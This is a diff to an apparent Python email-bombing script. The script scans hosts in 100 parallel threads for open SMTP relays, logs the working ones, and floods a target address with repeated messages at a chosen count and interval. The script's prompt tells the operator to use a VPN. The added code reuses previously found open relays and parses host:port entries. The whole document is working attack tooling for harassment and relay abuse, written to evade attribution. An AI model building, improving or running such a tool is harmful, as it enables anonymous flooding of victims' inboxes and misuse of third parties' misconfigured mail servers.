@@ -25,6 +25,19 @@ def validate_email(email):
     email_regex = r"^[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+$"
     return re.match(email_regex, email) is not None
 
+def load_previous_ips():
+    filepath = 'open_smtp_servers.log'
+    if not os.path.exists(filepath):
+        return []
+    
+    print("A log file with previously found working IP addresses has been detected.")
+    choice = input("Would you like to use these IP addresses first? (Y/N): ")
+    if choice.lower() == 'y':
+        with open(filepath, 'r') as file:
+            return [line.strip() for line in file]
+    else:
+        return []
+
 def get_user_input():
     logging.debug("Entering get_user_input function")
     print(colored("\nWARNING: Make sure you're using a VPN.", 'red'))
@@ -247,16 +260,22 @@ def main():
             "Amy Aviator here! You know why I don't trust stairs? They're always up to something."
         ]
 
+        previous_ips = load_previous_ips()
         target_email, text_amount, wait, hostnames, port = get_user_input()
+
+        # Combine previous IPs and new hostnames
+        hostnames = previous_ips + hostnames
+
         found_server = None
         with ThreadPoolExecutor(max_workers=100) as executor:
-            future_to_hostname = {executor.submit(checker, hostname, port): hostname for hostname in hostnames}
+            future_to_hostname = {executor.submit(checker, hostname.split(':')[0], int(hostname.split(':')[1] if ':' in hostname else port)): hostname for hostname in hostnames}
             try:
                 for future in concurrent.futures.as_completed(future_to_hostname):
                     hostname = future_to_hostname[future]
                     try:
                         if future.result():
-                            found_server = hostname
+                            found_server = hostname.split(':')[0]
+                            port = int(hostname.split(':')[1] if ':' in hostname else port)
                             break
                     except Exception as exc:
                         print('%r generated an exception: %s' % (hostname, exc))
@@ -264,13 +283,14 @@ def main():
                 print("\nProgram terminated by user. Exiting...")
                 executor.shutdown(wait=False)
                 return
+
         if found_server is not None:
             log_open_smtp_server(found_server, port)
             server = create_smtp_server(found_server, port)
             if server is not None:
                 send_emails(server, target_email, text_amount, wait, messages)
         else:
-            print("No open SMTP server found in the provided range.")
+            print("No open SMTP server found.")
     except KeyboardInterrupt:
         print("\nProgram terminated by user. Exiting...")
     except ImportError as e:
@@ -280,7 +300,7 @@ def main():
     finally:
         if 'server' in locals():
             server.quit()
-            
+
 if __name__ == "__main__":
     logging.debug("Starting script")
     main()
